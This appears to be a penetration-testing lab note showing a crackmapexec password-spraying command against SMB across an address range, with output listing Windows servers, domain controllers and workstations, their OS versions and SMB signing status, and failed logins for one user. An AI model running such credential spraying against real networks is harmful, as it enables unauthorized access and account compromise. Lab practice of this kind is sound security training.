crackmapexec password spraying
```bash
# can try without local auth as well
crackmapexec smb --local-auth 10.10.110.0-255 -u "joe" -p "Dev0ftheyear!" > passwordspray.smb
#results
┌──(root㉿kali)-[/home/bugs/offshore/10.10.110.123]
└─# cat passwordspray.smb       
SMB         172.16.1.30     445    MS01             [*] Windows Server 2016 Standard 14393 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:True)
SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:FS01) (signing:False) (SMBv1:True)
SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:True)
SMB         172.16.1.15     445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:WS02) (signing:False) (SMBv1:True)
SMB         172.16.1.24     445    WEB-WIN01        [*] Windows 10.0 Build 14393 x64 (name:WEB-WIN01) (domain:WEB-WIN01) (signing:False) (SMBv1:False)
SMB         172.16.1.36     445    WSADM            [*] Windows 10.0 Build 17134 x64 (name:WSADM) (domain:WSADM) (signing:False) (SMBv1:False)
SMB         172.16.1.30     445    MS01             [-] MS01\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.26     445    FS01             [-] FS01\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.5      445    DC01             [-] DC01\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.15     445    SQL01            [-] SQL01\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    WS02             [-] WS02\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.24     445    WEB-WIN01        [-] WEB-WIN01\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.36     445    WSADM            [-] WSADM\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.200    445    DC0              [*] Windows 10.0 Build 17763 x64 (name:DC0) (domain:DC0) (signing:True) (SMBv1:False)
SMB         172.16.1.201    445    JOE-LPTP         [*] Windows 10.0 Build 19041 x64 (name:JOE-LPTP) (domain:JOE-LPTP) (signing:False) (SMBv1:False)
SMB         172.16.1.200    445    DC0              [-] DC0\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.201    445    JOE-LPTP         [-] JOE-LPTP\joe:Dev0ftheyear STATUS_LOGON_FAILURE 
SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:SRV01) (signing:True) (SMBv1:True)
SMB         172.16.1.220    445    SRV01            [-] SRV01\joe:Dev0ftheyear STATUS_LOGON_FAILURE 

```